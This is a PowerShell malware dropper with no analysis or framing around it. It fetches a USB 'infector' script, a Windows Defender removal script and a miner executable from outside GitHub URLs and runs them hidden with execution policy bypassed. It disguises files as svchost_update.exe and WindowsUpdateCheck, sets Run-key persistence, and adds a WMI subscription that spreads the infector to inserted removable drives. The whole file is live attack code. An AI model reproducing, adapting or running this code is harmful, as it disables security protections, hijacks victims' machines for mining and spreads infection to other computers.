# Wait for initial system stabilization
Start-Sleep -Seconds 15

# Define file paths and URLs
$monitorScriptPath = "C:\Windows\Temp\monitor.ps1"
$infectorUrl = "https://github.com/NaomiMendoza127/USB/raw/refs/heads/main/infector.ps1"
$windowsDefenderScriptPath = "C:\Windows\Temp\windowsdenderscript.ps1"
$windowsDefenderScriptUrl = "https://github.com/NaomiMendoza127/WinDefenderDelete/raw/refs/heads/main/WindefendDelete.ps1"
$payloadUrl = "https://github.com/NaomiMendoza127/miner/raw/refs/heads/main/R_Final.exe"
$payloadPath = "C:\Windows\Temp\svchost_update.exe"
$crackedSoftwareZipUrl = "https://github.com/NaomiMendoza127/miner/raw/refs/heads/main/SystemCore.zip"
$crackedSoftwareZipPath = "C:\Windows\Temp\update_package.zip"
$crackedSoftwareFolder = "C:\Windows\Temp\WindowsServices"
$crackedSoftwareExe = "$crackedSoftwareFolder\SystemCore\ServiceHost.exe"

# Function to check if running as Administrator
function Is-Admin {
    $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = New-Object Security.Principal.WindowsPrincipal($identity)
    return $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

# Check if script is running as admin
if (-not (Is-Admin)) {
    Write-Output "This script requires administrative privileges."
    exit
}

# Check Windows Defender status
$defenderRunning = $false
$maxAttempts = 20
$delayBetweenChecks = 5
for ($i = 0; $i -lt $maxAttempts; $i++) {
    try {
        $defenderService = Get-Service -Name WinDefend -ErrorAction Stop
        $mpStatus = Get-MpComputerStatus -ErrorAction SilentlyContinue
        if ($defenderService.Status -eq 'Running' -and $mpStatus.RealTimeProtectionEnabled -eq $true) {
            $defenderRunning = $true
            break
        }
    } catch {
        Write-Output "Error checking Windows Defender status: $_"
    }
    Start-Sleep -Seconds $delayBetweenChecks
}

# Download files with retry logic
$retryCount = 3

# Download monitor.ps1
if (-not (Test-Path -Path $monitorScriptPath)) {
    for ($i = 0; $i -lt $retryCount; $i++) {
        try {
            Invoke-WebRequest -Uri $infectorUrl -OutFile $monitorScriptPath -UseBasicParsing -TimeoutSec 60 -ErrorAction Stop
            if (-not (Test-Path -Path $monitorScriptPath)) {
                throw "Downloaded monitor.ps1 not found at $monitorScriptPath."
            }
            Unblock-File -Path $monitorScriptPath -ErrorAction Stop
            Write-Output "Downloaded monitor.ps1 successfully."
            break
        } catch {
            Write-Output "Error downloading monitor.ps1: $_"
            Start-Sleep -Seconds 2
        }
    }
}

# Download windowsdenderscript.ps1
if (-not (Test-Path -Path $windowsDefenderScriptPath)) {
    for ($i = 0; $i -lt $retryCount; $i++) {
        try {
            Invoke-WebRequest -Uri $windowsDefenderScriptUrl -OutFile $windowsDefenderScriptPath -UseBasicParsing -TimeoutSec 60 -ErrorAction Stop
            if (-not (Test-Path -Path $windowsDefenderScriptPath)) {
                throw "Downloaded windowsdenderscript.ps1 not found at $windowsDefenderScriptPath."
            }
            Unblock-File -Path $windowsDefenderScriptPath -ErrorAction Stop
            Write-Output "Downloaded windowsdenderscript.ps1 successfully."
            break
        } catch {
            Write-Output "Error downloading windowsdenderscript.ps1: $_"
            Start-Sleep -Seconds 2
        }
    }
}

# Download svchost_update.exe
if (-not (Test-Path -Path $payloadPath)) {
    for ($i = 0; $i -lt $retryCount; $i++) {
        try {
            Invoke-WebRequest -Uri $payloadUrl -OutFile $payloadPath -UseBasicParsing -TimeoutSec 60 -ErrorAction Stop
            if (-not (Test-Path -Path $payloadPath)) {
                throw "Downloaded file not found at $payloadPath."
            }
            Unblock-File -Path $payloadPath -ErrorAction Stop
            Write-Output "Downloaded svchost_update.exe successfully."
            break
        } catch {
            Write-Output "Error downloading svchost_update.exe: $_"
            Start-Sleep -Seconds 2
        }
    }
}

# Download and extract SystemCore.zip
if (-not (Test-Path -Path $crackedSoftwareFolder)) {
    for ($i = 0; $i -lt $retryCount; $i++) {
        try {
            Invoke-WebRequest -Uri $crackedSoftwareZipUrl -OutFile $crackedSoftwareZipPath -UseBasicParsing -TimeoutSec 60 -ErrorAction Stop
            if (-not (Test-Path -Path $crackedSoftwareZipPath)) {
                throw "Downloaded zip file not found at $crackedSoftwareZipPath."
            }
            Expand-Archive -Path $crackedSoftwareZipPath -DestinationPath $crackedSoftwareFolder -Force -ErrorAction Stop
            if (-not (Test-Path -Path $crackedSoftwareExe)) {
                throw "Update executable missing."
            }
            Unblock-File -Path "$crackedSoftwareFolder\*" -ErrorAction Stop
            Write-Output "Downloaded and extracted SystemCore.zip successfully."
            break
        } catch {
            Write-Output "Error downloading or extracting SystemCore.zip: $_"
            Start-Sleep -Seconds 2
        }
    }
}

# Execute appropriate file based on Windows Defender status
if ($defenderRunning) {
    if (Test-Path -Path $windowsDefenderScriptPath) {
        try {
            Start-Process -FilePath "powershell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$windowsDefenderScriptPath`"" -WindowStyle Hidden -ErrorAction Stop
            Write-Output "Windows Defender is running. Executed windowsdenderscript.ps1."
        } catch {
            Write-Output "Error executing windowsdenderscript.ps1: $_"
        }
    } else {
        Write-Output "windowsdenderscript.ps1 not found at $windowsDefenderScriptPath."
    }
} else {
    if (Test-Path -Path $payloadPath) {
        if ([System.IO.Path]::GetExtension($payloadPath).ToLower() -eq ".exe") {
            try {
                Start-Process -FilePath $payloadPath -WindowStyle Hidden -ErrorAction Stop
                Write-Output "Windows Defender is not running. Executed svchost_update.exe."
            } catch {
                Write-Output "Error executing svchost_update.exe: $_"
            }
        }
    } else {
        Write-Output "svchost_update.exe not found at $payloadPath."
    }
}

# Set up registry persistence
try {
    $regPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
    $regName = "WindowsUpdateCheck"
    $scriptPath = $PSCommandPath
    $command = "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptPath`""
    $regExists = Get-ItemProperty -Path $regPath -Name $regName -ErrorAction SilentlyContinue
    if ($regExists -and $regExists.WindowsUpdateCheck -eq $command) {
        Write-Output "Registry persistence already set."
    } else {
        if (-not (Test-Path $regPath)) {
            New-Item -Path $regPath -Force | Out-Null
        }
        Set-ItemProperty -Path $regPath -Name $regName -Value $command -ErrorAction Stop
        Write-Output "Registry persistence set successfully."
    }
} catch {
    Write-Output "Error setting registry persistence: $_"
}

# Set up WMI event subscription for USB monitoring
try {
    $filterName = "USBInsertionFilter"
    $consumerName = "USBMonitorConsumer"
    $existingFilter = Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter "Name='$filterName'"
    $existingConsumer = Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter "Name='$consumerName'"
    $existingBinding = Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding -Filter "Filter = ""__EventFilter.Name='$filterName'"" AND Consumer = ""CommandLineEventConsumer.Name='$consumerName'"""
    if ($existingFilter -and $existingConsumer -and $existingBinding) {
        Write-Output "WMI event subscription already exists."
    } else {
        if ($existingBinding) {
            $existingBinding | Remove-WmiObject
        }
        if ($existingFilter) {
            $existingFilter | Remove-WmiObject
        }
        if ($existingConsumer) {
            $existingConsumer | Remove-WmiObject
        }
        $query = "SELECT * FROM __InstanceCreationEvent WITHIN 2 WHERE TargetInstance ISA 'Win32_LogicalDisk' AND TargetInstance.DriveType=2"
        $filter = Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments @{
            Name = $filterName
            EventNamespace = "root\cimv2"
            QueryLanguage = "WQL"
            Query = $query
        }
        $commandLine = "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$monitorScriptPath`" -DriveLetter %TargetInstance.DeviceID%"
        $consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{
            Name = $consumerName
            CommandLineTemplate = $commandLine
        }
        $binding = Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{
            Filter = $filter
            Consumer = $consumer
        }
        Write-Output "WMI event subscription set successfully."
    }
} catch {
    Write-Output "Error setting WMI event subscription: $_"
}
